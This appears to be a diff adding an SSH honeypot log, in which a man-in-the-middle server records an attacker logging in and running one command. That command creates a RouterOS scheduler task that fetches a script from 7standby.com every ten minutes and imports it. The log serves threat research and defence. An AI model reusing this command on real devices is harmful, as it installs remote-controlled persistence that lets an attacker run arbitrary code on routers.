@@ -1,0 +1,18 @@
+2019-11-14 08:01:19.415 - [Info] MITM Version: 1.26
+2019-11-14 08:01:19.422 - [Info] Auto Access Enabled: true
+2019-11-14 08:01:19.423 - [Debug] [Init] Auto Access Barrier: true
+2019-11-14 08:01:19.445 - [Info] SSH man-in-the-middle server for 172.20.0.2 listening on 0.0.0.0:10101
+2019-11-14 08:08:38.506 - [Debug] [Connection] Attacker connected: 103.78.96.128 | Client Identification: SSH-2.0-Go
+2019-11-14 08:08:41.344 - [Debug] [Auth] Attacker 103.78.96.128 trying to authenticate with "none"
+2019-11-14 08:08:41.344 - [Debug] [Auth] Attacker authentication error: No authentication method provided
+2019-11-14 08:08:42.122 - [Debug] [Auth] Attacker 103.78.96.128 trying to authenticate with "password"
+2019-11-14 08:08:42.124 - [Debug] [Auto Access] Attacker: 103.78.96.128, Threshold: 1, Attempts: 1
+2019-11-14 08:08:42.124 - [Debug] [Auto Access] Compromising the honeypot
+2019-11-14 08:08:42.124 - [Debug] [Auto Access] Adding the following credentials: "system:f6c55c73"
+2019-11-14 08:08:42.458 - [Debug] [Auth] Valid credentials - Password Authentication
+2019-11-14 08:08:42.459 - [Debug] [LXC] Attempting to connect to the honeypot: 172.20.0.2
+2019-11-14 08:08:42.600 - [Debug] [LXC-Auth] Attacker authenticated and is inside container
+2019-11-14 08:08:44.061 - [Debug] [EXEC] Noninteractive mode attacker command: /system scheduler add name="U6" interval=10m on-event="/tool fetch url=http://7standby.com/poll/80e76119-c608-4e5e-9caf-16b65e8d1201 mode=http dst-path=7wmp0b4s.rsc\r\n/import 7wmp0b4s.rsc" policy=api,ftp,local,password,policy,read,reboot,sensitive,sniff,ssh,telnet,test,web,winbox,write
+2019-11-14 08:08:45.085 - [Debug] [Connection] Attacker closed connection
+2019-11-14 08:08:45.101 - [Debug] [LXC] Container's OpenSSH server ended connection
+2019-11-14 08:08:45.102 - [Debug] [LXC] Container's OpenSSH server closed connection
